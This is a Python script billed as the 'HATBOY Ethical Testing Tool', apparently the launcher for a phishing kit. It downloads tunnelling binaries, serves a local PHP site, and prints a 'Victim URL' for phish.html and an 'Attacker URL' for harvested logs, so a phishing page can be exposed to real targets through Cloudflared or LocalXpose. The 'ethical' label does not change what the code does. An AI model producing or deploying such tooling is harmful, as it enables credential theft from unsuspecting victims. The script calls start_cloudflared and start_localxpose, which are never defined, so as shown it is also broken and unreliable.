import os
import json
import subprocess
import platform
import shutil
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
from typing import Optional

CONFIG_FILE = "config.json"

# Display a professional tool banner
def display_banner():
    print("\033[1;92m")
    print("██╗  ██╗ █████╗ ████████╗██████╗  ██████╗ ██╗   ██╗")
    print("██║  ██║██╔══██╗╚══██╔══╝██╔══██╗██╔═══██╗██║   ██║")
    print("███████║███████║   ██║   ██████╔╝██║   ██║██║   ██║")
    print("██╔══██║██╔══██║   ██║   ██   ██╗██║   ██║██║   ██║")
    print("██║  ██║██║  ██║   ██║   ██████╔╝╚██████╔╝╚██████╔╝")
    print("╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═██║═╝ ")
    print("\033[1;94m")
    print("                H A T B OY")
    print("         Ethical Testing Tool v2.0")
    print("\033[1;93m")
    print("       Developed by Mister-God")
    print("\033[0m")

# Load or initialize the configuration file
def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as file:
            return json.load(file)
    else:
        return {"localxpose_token": "", "port": "8080", "attacker_port": "9090"}

# Save configuration to file
def save_config(config: dict):
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

# Check and install dependencies
def check_dependencies():
    print("[*] Checking dependencies...")
    required_tools = ["php", "curl"]
    for tool in required_tools:
        if not shutil.which(tool):
            print(f"[!] Missing dependency: {tool}. Please install it and try again.")
            exit(1)
    print("[*] All dependencies are installed.")

# Install Cloudflared
def install_cloudflared():
    print("[*] Installing Cloudflared...")
    if not os.path.exists(".server"):
        os.makedirs(".server")
    arch = platform.machine()
    if arch == "x86_64":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    elif "arm" in arch:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
    else:
        print("[!] Unsupported architecture.")
        return
    cloudflared_path = ".server/cloudflared"
    retries = 3
    for attempt in range(retries):
        try:
            subprocess.run(["curl", "-s", "-L", "-o", cloudflared_path, url], check=True)
            os.chmod(cloudflared_path, 0o755)
            if os.path.exists(cloudflared_path):
                print("[*] Cloudflared installed successfully.")
                return
        except subprocess.CalledProcessError as e:
            print(f"[!] Attempt {attempt + 1}/{retries} failed: {e}")
            if attempt < retries - 1:
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
            else:
                print("[!] Cloudflared installation failed after multiple attempts.")
                exit(1)

# Install LocalXpose
def install_localxpose():
    print("[*] Installing LocalXpose...")
    if not os.path.exists(".server"):
        os.makedirs(".server")
    arch = platform.machine()
    if arch == "x86_64":
        url = "https://github.com/localxpose/loclx/releases/latest/download/loclx-linux-amd64"
    elif "arm" in arch:
        url = "https://github.com/localxpose/loclx/releases/latest/download/loclx-linux-arm"
    else:
        print("[!] Unsupported architecture.")
        return
    loclx_path = ".server/loclx"
    retries = 3
    for attempt in range(retries):
        try:
            subprocess.run(["curl", "-s", "-L", "-o", loclx_path, url], check=True)
            os.chmod(loclx_path, 0o755)
            if os.path.exists(loclx_path) and os.access(loclx_path, os.X_OK):
                print("[*] LocalXpose installed successfully.")
                return
            else:
                print("[!] LocalXpose binary is not executable. Please check the file.")
                exit(1)
        except subprocess.CalledProcessError as e:
            print(f"[!] Attempt {attempt + 1}/{retries} failed: {e}")
            if attempt < retries - 1:
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
            else:
                print("[!] LocalXpose installation failed after multiple attempts.")
                exit(1)

# Start a PHP server
def start_php_server(port: str):
    print(f"[*] Starting PHP server on port {port}...")
    os.chdir(".server/www")
    subprocess.Popen([f"php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.chdir("../..")

# Main menu
def main_menu():
    config = load_config()
    port = config.get("port", "8080")
    attacker_port = config.get("attacker_port", "9090")
    print("[*] Select an option:")
    print("[1] Localhost")
    print("[2] Cloudflared")
    print("[3] LocalXpose")
    choice = input("Enter your choice: ").strip()
    if choice == "1":
        start_php_server(port)
        print(f"[+] Victim URL: http://127.0.0.1:{port}/phish.html")
        print(f"[+] Attacker URL: http://127.0.0.1:{attacker_port}/logs.html")
    elif choice == "2":
        start_php_server(port)
        tunnel_url = start_cloudflared(port)
        if tunnel_url:
            print(f"[+] Victim Tunnel URL: {tunnel_url}/phish.html")
            print(f"[+] Attacker URL: http://127.0.0.1:{attacker_port}/logs.html")
        else:
            print("[!] Unable to create Cloudflared tunnel.")
    elif choice == "3":
        token = config.get("localxpose_token")
        if not token:
            token = input("Enter your LocalXpose token: ").strip()
            config["localxpose_token"] = token
            save_config(config)
        start_php_server(port)
        tunnel_url = start_localxpose(port, token)
        if tunnel_url:
            print(f"[+] Victim Tunnel URL: {tunnel_url}/phish.html")
            print(f"[+] Attacker URL: http://127.0.0.1:{attacker_port}/logs.html")
        else:
            print("[!] Unable to create LocalXpose tunnel.")
    else:
        print("[!] Invalid choice. Exiting.")

if __name__ == "__main__":
    display_banner()
    if not os.path.exists(".server/www"):
        os.makedirs(".server/www")
    check_dependencies()
    main_menu()
